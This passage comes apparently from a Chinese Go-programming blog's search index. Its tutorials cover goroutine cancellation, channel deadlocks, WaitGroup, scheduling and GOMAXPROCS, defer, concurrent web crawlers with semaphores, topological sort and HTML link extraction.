chan&lt;- int64) &#123; defer n.Done() if cancelled() &#123; return &#125; for _, entry := range dirents(dir) &#123; // ... &#125;&#125; 在walkDir函数的循环中我们对取消状态进行轮询可以带来明显的益处，可以避免在取消事件发生时还去创建goroutine。取消本身是有一些代价的；想要快速的响应需要对程序逻辑进行侵入式的修改。确保在取消发生之后不要有代价太大的操作可能会需要修改你代码里的很多地方，但是在一些重要的地方去检查取消事件也确实能带来很大的好处。 对这个程序的一个简单的性能分析可以揭示瓶颈在dirents函数中获取一个信号量。下面的select可以让这种操作可以被取消，并且可以将取消时的延迟从几百毫秒降低到几十毫秒。 123456789func dirents(dir string) []os.FileInfo &#123; select &#123; case sema &lt;- struct&#123;&#125;&#123;&#125;: // acquire token case &lt;-done: return nil // cancelled &#125; defer func() &#123; &lt;-sema &#125;() // release token // ...read directory...&#125; 现在当取消发生时，所有后台的goroutine都会迅速停止并且主函数会返回。当然，当主函数返回时，一个程序会退出，而我们又无法在主函数退出的时候确认其已经释放了所有的资源(译注：因为程序都退出了，你的代码都没法执行了) 。这里有一个方便的窍门我们可以一用：取代掉直接从主函数返回，我们调用一个panic，然后runtime会把每一个goroutine的栈dump下来。如果main goroutine是唯一一个剩下的goroutine的话，他会清理掉自己的一切资源。但是如果还有其它的goroutine没有退出，他们可能没办法被正确地取消掉，也有可能被取消但是取消操作会很花时间；所以这里的一个调研还是很有必要的。我们用panic来获取到足够的信息来验证我们上面的判断，看看最终到底是什么样的情况。 通道的关闭 12345678910111213141516171819202122232425262728293031package mainimport ( \"fmt\" \"time\")func worker(id int, c chan int) &#123; for n := range c &#123; fmt.Printf(\"Worker %d received %c\\n\", id, n) &#125;&#125;func channelClose() &#123; c := make(chan int) go worker(0, c) c &lt;- 'a' c &lt;- 'b' c &lt;- 'c' c &lt;- 'd' close(c) time.Sleep(time.Millisecond)&#125;func main() &#123; channelClose()&#125; 通道的经典死锁现象 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758package mainimport ( \"fmt\")func doWork(id int, c chan int,done chan bool) &#123; for n := range c &#123; fmt.Printf(\"Worker %d received %c\\n\", id, n) //done 代表任务做完，需要人来接收。因为done一直等不到人来接收，就会卡住，卡住就不会接收C done &lt;- true &#125;&#125;type worker struct &#123; in chan int done chan bool&#125;func createWorker( id int) worker &#123; w := worker&#123; in: make(chan int), done:make(chan bool), &#125; go doWork(id, w.in,w.done) return w&#125;func chanDemo() &#123; var workers [10]worker for i := 0; i &lt; 10; i++ &#123; workers[i] = createWorker(i) &#125; //第一遍循环顺利进行 for i, worker := range workers &#123; worker.in &lt;- 'a' + i &#125; //第二遍循环会陷入死锁，原因见上。 for i, worker := range workers &#123; worker.in &lt;- 'A' + i &#125; for _,worker := range workers&#123; &lt;-worker.done &lt;-worker.done &#125;&#125;func main() &#123; chanDemo()&#125; 死锁的解决方法1: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657package mainimport ( \"fmt\")func doWork(id int, c chan int,done chan bool) &#123; for n := range c &#123; fmt.Printf(\"Worker %d received %c\\n\", id, n) done &lt;- true &#125;&#125;type worker struct &#123; in chan int done chan bool&#125;func createWorker( id int) worker &#123; w := worker&#123; in: make(chan int), done:make(chan bool), &#125; go doWork(id, w.in,w.done) return w&#125;func chanDemo() &#123; var workers [10]worker for i := 0; i &lt; 10; i++ &#123; workers[i] = createWorker(i) &#125; for i, worker := range workers &#123; worker.in &lt;- 'a' + i &#125; for _,worker := range workers&#123; &lt;-worker.done &#125; for i, worker := range workers &#123; worker.in &lt;- 'A' + i &#125; for _,worker := range workers&#123; &lt;-worker.done &#125;&#125;func main() &#123; chanDemo()&#125; 死锁的解决方法2: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556package mainimport ( \"fmt\")func doWork(id int, c chan int,done chan bool) &#123; for n := range c &#123; fmt.Printf(\"Worker %d received %c\\n\", id, n) go func() &#123; done &lt;- true&#125;() &#125;&#125;type worker struct &#123; in chan int done chan bool&#125;func createWorker( id int) worker &#123; w := worker&#123; in: make(chan int), done:make(chan bool), &#125; go doWork(id, w.in,w.done) return w&#125;func chanDemo() &#123; var workers [10]worker for i := 0; i &lt; 10; i++ &#123; workers[i] = createWorker(i) &#125; for i, worker := range workers &#123; worker.in &lt;- 'a' + i &#125; for i, worker := range workers &#123; worker.in &lt;- 'A' + i &#125; for _,worker := range workers&#123; &lt;-worker.done &lt;-worker.done &#125;&#125;func main() &#123; chanDemo()&#125; sync.WaitGroup 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455package mainimport ( \"fmt\" \"sync\")func doWork(id int, w worker) &#123; for n := range w.in &#123; fmt.Printf(\"Worker %d received %c\\n\", id, n) w.done() &#125;&#125;type worker struct &#123; in chan int done func()&#125;func createWorker( id int, wg *sync.WaitGroup) worker &#123; w := worker&#123; in: make(chan int), done: func() &#123; wg.Done() &#125;, &#125; go doWork(id, w) return w&#125;func chanDemo() &#123; var wg sync.WaitGroup var workers [10]worker for i := 0; i &lt; 10; i++ &#123; workers[i] = createWorker(i, &amp;wg) &#125; wg.Add(20) for i, worker := range workers &#123; worker.in &lt;- 'a' + i &#125; for i, worker := range workers &#123; worker.in &lt;- 'A' + i &#125; wg.Wait()&#125;func main() &#123; chanDemo()&#125; 动态栈 每一个OS线程都有一个固定大小的内存块(一般会是2MB)来做栈，这个栈会用来存储当前正在被调用或挂起(指在调用其它函数时)的函数的内部变量。这个固定大小的栈同时很大又很小。因为2MB的栈对于一个小小的goroutine来说是很大的内存浪费，比如对于我们用到的，一个只是用来WaitGroup之后关闭channel的goroutine来说。而对于go程序来说，同时创建成百上千个gorutine是非常普遍的，如果每一个goroutine都需要这么大的栈的话，那这么多的goroutine就不太可能了。除去大小的问题之外，固定大小的栈对于更复杂或者更深层次的递归函数调用来说显然是不够的。修改固定的大小可以提升空间的利用率允许创建更多的线程，并且可以允许更深的递归调用，不过这两者是没法同时兼备的。 相反，一个goroutine会以一个很小的栈开始其生命周期，一般只需要2KB。一个goroutine的栈，和操作系统线程一样，会保存其活跃或挂起的函数调用的本地变量，但是和OS线程不太一样的是一个goroutine的栈大小并不是固定的；栈的大小会根据需要动态地伸缩。而goroutine的栈的最大值有1GB，比传统的固定大小的线程栈要大得多，尽管一般情况下，大多goroutine都不需要这么大的栈。 练习9.4: 创建一个流水线程序，支持用channel连接任意数量的goroutine，在跑爆内存之前，可以创建多少流水线阶段？一个变量通过整个流水线需要用多久？(这个练习题翻译不是很确定。。) Goroutine调度 OS线程会被操作系统内核调度。每几毫秒，一个硬件计时器会中断处理器，这会调用一个叫作scheduler的内核函数。这个函数会挂起当前执行的线程并保存内存中它的寄存器内容，检查线程列表并决定下一次哪个线程可以被运行，并从内存中恢复该线程的寄存器信息，然后恢复执行该线程的现场并开始执行线程。因为操作系统线程是被内核所调度，所以从一个线程向另一个“移动”需要完整的上下文切换，也就是说，保存一个用户线程的状态到内存，恢复另一个线程的到寄存器，然后更新调度器的数据结构。这几步操作很慢，因为其局部性很差需要几次内存访问，并且会增加运行的cpu周期。 Go的运行时包含了其自己的调度器，这个调度器使用了一些技术手段，比如m:n调度，因为其会在n个操作系统线程上多工(调度)m个goroutine。Go调度器的工作和内核的调度是相似的，但是这个调度器只关注单独的Go程序中的goroutine(译注：按程序独立)。 和操作系统的线程调度不同的是，Go调度器并不是用一个硬件定时器而是被Go语言&quot;建筑&quot;本身进行调度的。例如当一个goroutine调用了time.Sleep或者被channel调用或者mutex操作阻塞时，调度器会使其进入休眠并开始执行另一个goroutine直到时机到了再去唤醒第一个goroutine。因为因为这种调度方式不需要进入内核的上下文，所以重新调度一个goroutine比调度一个线程代价要低得多。 GOMAXPROCS Go的调度器使用了一个叫做GOMAXPROCS的变量来决定会有多少个操作系统的线程同时执行G​​o的代码。其默认的值是运行机器上的CPU的核心数，所以在一个有8个核心的机器上时，调度器一次会在8个OS线程上去调度GO代码。(GOMAXPROCS是前面说的m:n调度中的n)。在休眠中的或者在通信中被阻塞的goroutine是不需要一个对应的线程来做调度的。在I/O中或系统调用中或调用非Go语言函数时，是需要一个对应的操作系统线程的，但是GOMAXPROCS并不需要将这几种情况计数在内。 你可以用GOMAXPROCS的环境变量吕显式地控制这个参数，或者也可以在运行时用runtime.GOMAXPROCS函数来修改它。我们在下面的小程序中会看到GOMAXPROCS的效果，这个程序会无限打印0和1。 for { go fmt.Print(0) fmt.Print(1) } $ GOMAXPROCS=1 go run hacker-cliché.go 111111111111111111110000000000000000000011111… $ GOMAXPROCS=2 go run hacker-cliché.go 010101010101010101011001100101011010010100110… 在第一次执行时，最多同时只能有一个goroutine被执行。初始情况下只有main goroutine被执行，所以会打印很多1。过了一段时间后，GO调度器会将其置为休眠，并唤醒另一个goroutine，这时候就开始打印很多0了，在打印的时候，goroutine是被调度到操作系统线程上的。在第二次执行时，我们使用了两个操作系统线程，所以两个goroutine可以一起被执行，以同样的频率交替打印0和1。我们必须强调的是goroutine的调度是受很多因子影响的，而runtime也是在不断地发展演进的，所以这里的你实际得到的结果可能会因为版本的不同而与我们运行的结果有所不同。 Goroutine没有ID号 在大多数支持多线程的操作系统和程序语言中，当前的线程都有一个独特的身份(id)，并且这个身份信息可以以一个普通值的形式被被很容易地获取到，典型的可以是一个integer或者指针值。这种情况下我们做一个抽象化的thread-local storage(线程本地存储，多线程编程中不希望其它线程访问的内容)就很容易，只需要以线程的id作为key的一个map就可以解决问题，每一个线程以其id就能从中获取到值，且和其它线程互不冲突。 goroutine没有可以被程序员获取到的身份(id)的概念。这一点是设计上故意而为之，由于thread-local storage总是会被滥用。比如说，一个web server是用一种支持tls的语言实现的，而非常普遍的是很多函数会去寻找HTTP请求的信息，这代表它们就是去其存储层(这个存储层有可能是tls)查找的。这就像是那些过分依赖全局变量的程序一样，会导致一种非健康的“距离外行为”，在这种行为下，一个函数的行为可能不是由其自己内部的变量所决定，而是由其所运行在的线程所决定。因此，如果线程本身的身份会改变–比如一些worker线程之类的–那么函数的行为就会变得神秘莫测。 Go鼓励更为简单的模式，这种模式下参数对函数的影响都是显式的。这样不仅使程序变得更易读，而且会让我们自由地向一些给定的函数分配子任务时不用担心其身份信息影响行为。","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"golang[60]-defer-function","slug":"golang-62-defer-function","date":"2019-02-17T08:09:49.000Z","updated":"2019-02-28T13:09:51.184Z","comments":true,"path":"2019/02/17/golang-62-defer-function/","link":"","permalink":"https://dreamerjonson.com/2019/02/17/golang-62-defer-function/","excerpt":"","text":"为什么使用defer 查看下面的这个程序，重复的写入了多个 resp.Body.Close()。如果程序的错误检查足够多，我们就需要在每一次处理资源关闭，这是非常麻烦的，defer就可以为我们解决这个问题。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576package main/*//!+output$ go build gopl.io/ch5/title1$ ./title1 http://gopl.ioThe Go Programming Language$ ./title1 https://golang.org/doc/effective_go.htmlEffective Go - The Go Programming Language$ ./title1 https://golang.org/doc/gopher/frontpage.pngtitle: https://golang.org/doc/gopher/frontpage.png has type image/png, not text/html//!-output*/import ( \"fmt\" \"net/http\" \"os\" \"strings\" \"golang.org/x/net/html\")// Copied from gopl.io/ch5/outline2.func forEachNode(n *html.Node, pre, post func(n *html.Node)) &#123; if pre != nil &#123; pre(n) &#125; for c := n.FirstChild; c != nil; c = c.NextSibling &#123; forEachNode(c, pre, post) &#125; if post != nil &#123; post(n) &#125;&#125;//!+func title(url string) error &#123; resp, err := http.Get(url) if err != nil &#123; return err &#125; // Check Content-Type is HTML (e.g., \"text/html; charset=utf-8\"). ct := resp.Header.Get(\"Content-Type\") if ct != \"text/html\" &amp;&amp; !strings.HasPrefix(ct, \"text/html;\") &#123; resp.Body.Close() return fmt.Errorf(\"%s has type %s, not text/html\", url, ct) &#125; doc, err := html.Parse(resp.Body) resp.Body.Close() if err != nil &#123; return fmt.Errorf(\"parsing %s as HTML: %v\", url, err) &#125; visitNode := func(n *html.Node) &#123; if n.Type == html.ElementNode &amp;&amp; n.Data == \"title\" &amp;&amp; n.FirstChild != nil &#123; fmt.Println(n.FirstChild.Data) &#125; &#125; forEachNode(doc, visitNode, nil) return nil&#125;//!-func main() &#123; for _, arg := range os.Args[1:] &#123; if err := title(arg); err != nil &#123; fmt.Fprintf(os.Stderr, \"title: %v\\n\", err) &#125; &#125;&#125; defer特性 当出现defer时，函数和参数表达式将会被执行。但是函数真正的调用将会被延迟，直到包含defer的函数完成。可能会有多个defer，但是他们的执行顺序是相反的。 上面的例子可以修改为： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465package mainimport ( \"fmt\" \"net/http\" \"os\" \"strings\" \"golang.org/x/net/html\")// Copied from gopl.io/ch5/outline2.func forEachNode(n *html.Node, pre, post func(n *html.Node)) &#123; if pre != nil &#123; pre(n) &#125; for c := n.FirstChild; c != nil; c = c.NextSibling &#123; forEachNode(c, pre, post) &#125; if post != nil &#123; post(n) &#125;&#125;//!+func title(url string) error &#123; resp, err := http.Get(url) if err != nil &#123; return err &#125; defer resp.Body.Close() ct := resp.Header.Get(\"Content-Type\") if ct != \"text/html\" &amp;&amp; !strings.HasPrefix(ct, \"text/html;\") &#123; return fmt.Errorf(\"%s has type %s, not text/html\", url, ct) &#125; doc, err := html.Parse(resp.Body) if err != nil &#123; return fmt.Errorf(\"parsing %s as HTML: %v\", url, err) &#125; // ...print doc's title element... //!- visitNode := func(n *html.Node) &#123; if n.Type == html.ElementNode &amp;&amp; n.Data == \"title\" &amp;&amp; n.FirstChild != nil &#123; fmt.Println(n.FirstChild.Data) &#125; &#125; forEachNode(doc, visitNode, nil) //!+ return nil&#125;//!-func main() &#123; for _, arg := range os.Args[1:] &#123; if err := title(arg); err != nil &#123; fmt.Fprintf(os.Stderr, \"title: %v\\n\", err) &#125; &#125;&#125; defer常常使用在资源的打开或关闭中。 123456789package ioutilfunc ReadFile(filename string) ([]byte, error) &#123; f, err := os.Open(filename) if err != nil &#123; return nil, err &#125; defer f.Close() return ReadAll(f)&#125; 12345678 var mu sync.Mutex var m = make(map[string]int)func lookup(key string) int &#123; mu.Lock() defer mu.Unlock() return m[key]&#125; onenty 与 onexit行为 1234567891011121314151617181920212223242526272829303132333435// The trace program uses defer to add entry/exit diagnostics to a function.package mainimport ( \"log\" \"time\")//!+mainfunc bigSlowOperation() &#123; defer trace(\"bigSlowOperation\")() // don't forget the extra parentheses // ...lots of work... time.Sleep(10 * time.Second) // simulate slow operation by sleeping&#125;func trace(msg string) func() &#123; start := time.Now() log.Printf(\"enter %s\", msg) return func() &#123; log.Printf(\"exit %s (%s)\", msg, time.Since(start)) &#125;&#125;//!-mainfunc main() &#123; bigSlowOperation()&#125;/*!+output$ go build gopl.io/ch5/trace$ ./trace2015/11/18 09:53:26 enter bigSlowOperation2015/11/18 09:53:36 exit bigSlowOperation (10.000589217s)!-output*/ defer 等到修改了结果变量之后被调用 1234567func double(x int) (result int) &#123; defer func() &#123; fmt.Printf(\"double(%d) = %d\\n\", x, result) &#125;() return x + x&#125;_=double(4)// Output:// \"double(4) = 8\" 可以修改结果变量闭包的特性 12345func triple(x int) (result int) &#123;defer func() &#123; result += x &#125;()return double(x)&#125;fmt.Println(triple(4)) // \"12\" 小心循环里的defer 由于defer会在函数结束时执行，所以循环里的defer是非常危险的，下面的程序可能会因为用完了文件描述符而崩溃。 12345678for _, filename := range filenames &#123; f, err := os.Open(filename) if err != nil &#123; return err &#125; defer f.Close() // NOTE: risky; could run out of file descriptors// ...process f...&#125; 上面的程序可以修改为,包裹在一个函数中： 12345678910111213for _, filename := range filenames &#123; if err := doFile(filename); err != nil &#123; return err &#125;&#125;func doFile(filename string) error &#123; f, err := os.Open(filename) if err != nil &#123; return err &#125; defer f.Close() // ...process f...&#125; 错误与defer 12345678910111213141516func main() &#123; f(3)&#125;func f(x int) &#123; fmt.Printf(\"f(%d)\\n\", x+0/x) // panics if x == 0 defer fmt.Printf(\"defer %d\\n\", x) f(x - 1)&#125;When run, the program prints the following to the standard output:f(3)f(2)f(1)defer 1defer 2defer 3 defer 案例 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849// 1, 1, 2, 3, 5, 8, 13, ...func Fibonacci() func() int &#123; a, b := 0, 1 return func() int &#123; a, b = b, a+b return a &#125;&#125;func tryDefer() &#123; for i := 0; i &lt; 100; i++ &#123; defer fmt.Println(i) if i == 30 &#123; // Uncomment panic to see // how it works with defer // panic(\"printed too many\") &#125; &#125;&#125;func writeFile(filename string) &#123; file, err := os.OpenFile(filename, os.O_EXCL|os.O_CREATE|os.O_WRONLY, 0666) if err != nil &#123; if pathError, ok := err.(*os.PathError); !ok &#123; panic(err) &#125; else &#123; fmt.Printf(\"%s, %s, %s\\n\", pathError.Op, pathError.Path, pathError.Err) &#125; return &#125; defer file.Close() writer := bufio.NewWriter(file) defer writer.Flush() f := Fibonacci() for i := 0; i &lt; 20; i++ &#123; fmt.Fprintln(writer, f()) &#125;&#125;func main() &#123; tryDefer() writeFile(\"fib.txt\")&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"golang[5]-数据结构-广度优先搜索—爬虫案例","slug":"golang-5-structure-Breadth-first-search","date":"2019-02-16T04:39:04.000Z","updated":"2019-02-24T13:55:06.295Z","comments":true,"path":"2019/02/16/golang-5-structure-Breadth-first-search/","link":"","permalink":"https://dreamerjonson.com/2019/02/16/golang-5-structure-Breadth-first-search/","excerpt":"","text":"单爬虫 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697package mainimport ( \"fmt\" \"os\" \"net/http\" \"golang.org/x/net/html\" \"log\")func breadthFirst(f func(item string) []string, worklist []string) &#123; seen := make(map[string]bool) for len(worklist) &gt; 0 &#123; items := worklist worklist = nil for _, item := range items &#123; if !seen[item] &#123; seen[item] = true worklist = append(worklist, f(item)...) &#125; &#125; &#125;&#125;//!-breadthFirst//!+crawlfunc crawl(url string) []string &#123; fmt.Println(url) list, err := Extract(url) if err != nil &#123; log.Print(err) &#125; return list&#125;//!-crawl//!+mainfunc main() &#123; // Crawl the web breadth-first, // starting from the command-line arguments. breadthFirst(crawl, os.Args[1:])&#125;//!-mainfunc Extract(url string) ([]string, error) &#123; resp, err := http.Get(url) if err != nil &#123; return nil, err &#125; if resp.StatusCode != http.StatusOK &#123; resp.Body.Close() return nil, fmt.Errorf(\"getting %s: %s\", url, resp.Status) &#125; doc, err := html.Parse(resp.Body) resp.Body.Close() if err != nil &#123; return nil, fmt.Errorf(\"parsing %s as HTML: %v\", url, err) &#125; var links []string visitNode := func(n *html.Node) &#123; if n.Type == html.ElementNode &amp;&amp; n.Data == \"a\" &#123; for _, a := range n.Attr &#123; if a.Key != \"href\" &#123; continue &#125; link, err := resp.Request.URL.Parse(a.Val) if err != nil &#123; continue // ignore bad URLs &#125; links = append(links, link.String()) &#125; &#125; &#125; forEachNode(doc, visitNode, nil) return links, nil&#125;//!-Extract// Copied from gopl.io/ch5/outline2.func forEachNode(n *html.Node, pre, post func(n *html.Node)) &#123; if pre != nil &#123; pre(n) &#125; for c := n.FirstChild; c != nil; c = c.NextSibling &#123; forEachNode(c, pre, post) &#125; if post != nil &#123; post(n) &#125;&#125; 并发爬虫的错误案例 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061package mainimport ( \"fmt\" \"log\" \"os\" \"gopl.io/ch5/links\")//!+crawlfunc crawl(url string) []string &#123; fmt.Println(url) list, err := links.Extract(url) if err != nil &#123; log.Print(err) &#125; return list&#125;//!-crawl//!+mainfunc main() &#123; worklist := make(chan []string) // Start with the command-line arguments. go func() &#123; worklist &lt;- os.Args[1:] &#125;() // Crawl the web concurrently. seen := make(map[string]bool) for list := range worklist &#123; for _, link := range list &#123; if !seen[link] &#123; seen[link] = true go func(link string) &#123; worklist &lt;- crawl(link) &#125;(link) &#125; &#125; &#125;&#125;//!-main/*//!+output$ go build gopl.io/ch8/crawl1$ ./crawl1 http://gopl.io/http://gopl.io/https://golang.org/help/https://golang.org/doc/https://golang.org/blog/...2015/07/15 18:22:12 Get ...: dial tcp: lookup blog.golang.org: no such host2015/07/15 18:22:12 Get ...: dial tcp 23.21.222.120:443: socket: too many open files...//!-output*/ 最初的错误信息是一个让人莫名的DNS查找失败，卽使这个域名是完全可靠的。而随后的错误信息揭示了原因：这个程序一次性创建了太多网络连接，超过了每一个进程的打开文件数限制，旣而导致了在调用net.Dial像DNS查找失败这样的问题。 这个程序实在是太他妈并行了。无穷无尽地并行化并不是什么好事情，因为不管怎么说，你的系统总是会有一个些限制因素，比如CPU核心数会限制你的计算负载，比如你的硬盘转轴和磁头数限制了你的本地磁盘IO操作频率，比如你的网络带宽限制了你的下载速度上限，或者是你的一个web服务的服务容量上限等等。为了解决这个问题，我们可以限制并发程序所使用的资源来使之适应自己的运行环境。对于我们的例子来说，最简单的方法就是限制对links.Extract在同一时间最多不会有超过n次调用，这里的n是fd的limit-20，一般情况下。 我们可以用一个有容量限制的buffered channel来控制并发，这类似于操作系统里的计数信号量概念。从概念上讲，channel里的n个空槽代表n个可以处理内容的token(通行证)，从channel里接收一个值会释放其中的一个token，并且生成一个新的空槽位。这样保证了在没有接收介入时最多有n个发送操作。(这里可能我们拿channel里填充的槽来做token更直观一些，不过还是这样吧~)。由于channel里的元素类型并不重要，我们用一个零值的struct{}来作为其元素。 让我们重写crawl函数，将对links.Extract的调用操作用获取、释放token的操作包裹起来，来确保同一时间对其只有20个调用。信号量数量和其能操作的IO资源数量应保持接近。 第二个问题是这个程序永远都不会终止，卽使它已经爬到了所有初始链接衍生出的链接。为了使这个程序能够终止，我们需要在worklist为空或者没有crawl的goroutine在运行时退出主循环。这个版本中，计算器n对worklist的发送操作数量进行了限制。每一次我们发现有元素需要被发送到worklist时，我们都会对n进行操作，在向worklist中发送初始的命令行参数之前，我们也进行过一次操作。这里的操作++是在每启动一个crawler的goroutine之前。主循环会在n减为0时终止，这时候说明没活可干了。 现在这个并发爬虫会比5.6节中的深度优先搜索版快上20倍，而且不会出什么错，并且在其完成任务时也会正确地终止。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253package mainimport ( \"fmt\" \"log\" \"os\" \"gopl.io/ch5/links\")//!+sema// tokens is a counting semaphore used to// enforce a limit of 20 concurrent requests.var tokens = make(chan struct&#123;&#125;, 20)func crawl(url string) []string &#123; fmt.Println(url) tokens &lt;- struct&#123;&#125;&#123;&#125; // acquire a token list, err := links.Extract(url) &lt;-tokens // release the token if err != nil &#123; log.Print(err) &#125; return list&#125;//!-sema//!+func main() &#123; worklist := make(chan []string) var n int // number of pending sends to worklist // Start with the command-line arguments. n++ go func() &#123; worklist &lt;- os.Args[1:] &#125;() // Crawl the web concurrently. seen := make(map[string]bool) for ; n &gt; 0; n-- &#123; list := &lt;-worklist for _, link := range list &#123; if !seen[link] &#123; seen[link] = true n++ go func(link string) &#123; worklist &lt;- crawl(link) &#125;(link) &#125; &#125; &#125;&#125; 下面的程序是避免过度并发的另一种思路。这个版本使用了原来的crawl函数，但没有使用计数信号量，取而代之用了20个长活的crawler goroutine，这样来保证最多20个HTTP请求在并发。 123456789101112131415161718192021222324252627282930func main() &#123; worklist := make(chan []string) // lists of URLs, may have duplicates unseenLinks := make(chan string) // de-duplicated URLs // Add command-line arguments to worklist. go func() &#123; worklist &lt;- os.Args[1:] &#125;() // Create 20 crawler goroutines to fetch each unseen link. for i := 0; i &lt; 20; i++ &#123; go func() &#123; for link := range unseenLinks &#123; foundLinks := crawl(link) go func() &#123; worklist &lt;- foundLinks &#125;() &#125; &#125;() &#125; // The main goroutine de-duplicates worklist items // and sends the unseen ones to the crawlers. seen := make(map[string]bool) for list := range worklist &#123; for _, link := range list &#123; if !seen[link] &#123; seen[link] = true unseenLinks &lt;- link &#125; &#125; &#125;&#125; 所有的爬虫goroutine现在都是被同一个channel-unseenLinks喂饱的了。主goroutine负责拆分它从worklist里拿到的元素，然后把没有抓过的经由unseenLinks channel发送给一个爬虫的goroutine。 seen这个map被限定在main goroutine中；也就是说这个map只能在main goroutine中进行访问。类似于其它的信息隐藏方式，这样的约束可以让我们从一定程度上保证程序的正确性。例如，内部变量不能够在函数外部被访问到；变量在没有被转义的情况下是无法在函数外部访问的；一个对象的封装字段无法被该对象的方法以外的方法访问到。在所有的情况下，信息隐藏都可以帮助我们约束我们的程序，使其不发生意料之外的情况。 crawl函数爬到的链接在一个专有的goroutine中被发送到worklist中来避免死锁。为了节省空间，这个例子的终止问题我们先不进行详细阐述了。","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"golang[4]-数据结构-拓扑排序-深度优先搜索","slug":"golang-4-structure-topsort","date":"2019-02-16T04:26:00.000Z","updated":"2019-02-16T04:38:00.875Z","comments":true,"path":"2019/02/16/golang-4-structure-topsort/","link":"","permalink":"https://dreamerjonson.com/2019/02/16/golang-4-structure-topsort/","excerpt":"","text":"拓扑排序 排序前序课程、深度优先搜索 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263// The toposort program prints the nodes of a DAG in topological order.package mainimport ( \"fmt\" \"sort\")//!+table// prereqs maps computer science courses to their prerequisites.var prereqs = map[string][]string&#123; \"algorithms\": &#123;\"data structures\"&#125;, \"calculus\": &#123;\"linear algebra\"&#125;, \"compilers\": &#123; \"data structures\", \"formal languages\", \"computer organization\", &#125;, \"data structures\": &#123;\"discrete math\"&#125;, \"databases\": &#123;\"data structures\"&#125;, \"discrete math\": &#123;\"intro to programming\"&#125;, \"formal languages\": &#123;\"discrete math\"&#125;, \"networks\": &#123;\"operating systems\"&#125;, \"operating systems\": &#123;\"data structures\", \"computer organization\"&#125;, \"programming languages\": &#123;\"data structures\", \"computer organization\"&#125;,&#125;//!-table//!+mainfunc main() &#123; for i, course := range topoSort(prereqs) &#123; fmt.Printf(\"%d:\\t%s\\n\", i+1, course) &#125;&#125;func topoSort(m map[string][]string) []string &#123; var order []string seen := make(map[string]bool) var visitAll func(items []string) visitAll = func(items []string) &#123; for _, item := range items &#123; if !seen[item] &#123; seen[item] = true visitAll(m[item]) order = append(order, item) &#125; &#125; &#125; var keys []string for key := range m &#123; keys = append(keys, key) &#125; sort.Strings(keys) visitAll(keys) return order&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"golang[61]-parsehtml","slug":"golang-61-parsehtml","date":"2019-02-16T03:36:07.000Z","updated":"2019-02-16T04:03:21.070Z","comments":true,"path":"2019/02/16/golang-61-parsehtml/","link":"","permalink":"https://dreamerjonson.com/2019/02/16/golang-61-parsehtml/","excerpt":"","text":"将网页解析为类似js中的DOM对象 案例 获取页面中的url 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657package mainimport ( \"fmt\" \"net/http\" \"os\" \"golang.org/x/net/html\")// visit appends to links each link found in n, and returns the result.func visit(links []string, n *html.Node) []string &#123; if n.Type == html.ElementNode &amp;&amp; n.Data == \"a\" &#123; for _, a := range n.Attr &#123; if a.Key == \"href\" &#123; links = append(links, a.Val) &#125; &#125; &#125; for c := n.FirstChild; c != nil; c = c.NextSibling &#123; links = visit(links, c) &#125; return links&#125;//!+func main() &#123; for _, url := range os.Args[1:] &#123; links, err := findLinks(url) if err != nil &#123; fmt.Fprintf(os.Stderr, \"findlinks2: %v\\n\", err) continue &#125; for _, link := range links &#123; fmt.Println(link) &#125; &#125;&#125;// findLinks performs an HTTP GET request for url, parses the// response as HTML, and extracts and returns the links.func findLinks(url string) ([]string, error) &#123; resp, err := http.Get(url) if err != nil &#123; return nil, err &#125; if resp.StatusCode != http.StatusOK &#123; resp.Body.Close() return nil, fmt.Errorf(\"getting %s: %s\", url, resp.Status) &#125; doc, err := html.Parse(resp.Body) resp.Body.Close() if err != nil &#123; return nil, fmt.Errorf(\"parsing %s as HTML: %v\", url, err) &#125; return visit(nil, doc), nil&#125; 递归打印文件结构 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374package mainimport ( \"fmt\" \"net/http\" \"os\" \"golang.org/x/net/html\")func main() &#123; for _, url := range os.Args[1:] &#123; outline(url) &#125;&#125;func outline(url string) error &#123; resp, err := http.Get(url) if err != nil &#123; return err &#125; defer resp.Body.Close() doc, err := html.Parse(resp.Body) if err != nil &#123; return err &#125; //!+call forEachNode(doc, startElement, endElement) //!-call return nil&#125;//!+forEachNode// forEachNode calls the functions pre(x) and post(x) for each node// x in the tree rooted at n. Both functions are optional.// pre is called before the children are visited (preorder) and// post is called after (postorder).func forEachNode(n *html.Node, pre, post func(n *html.Node)) &#123; if pre != nil &#123; pre(n) &#125; for c := n.FirstChild; c != nil; c = c.NextSibling &#123; forEachNode(c, pre, post) &#125; if post != nil &#123; post(n) &#125;&#125;//!-forEachNode//!+startendvar depth intfunc startElement(n *html.Node) &#123; if n.Type == html.ElementNode &#123; fmt.Printf(\"%*s&lt;%s&gt;\\n\", depth*2, \"\", n.Data) depth++ &#125;&#125;func endElement(n *html.Node) &#123; if n.Type == html.ElementNode &#123; depth-- fmt.Printf(\"%*s&lt;/%s&gt;\\n\", depth*2, \"\", n.Data) 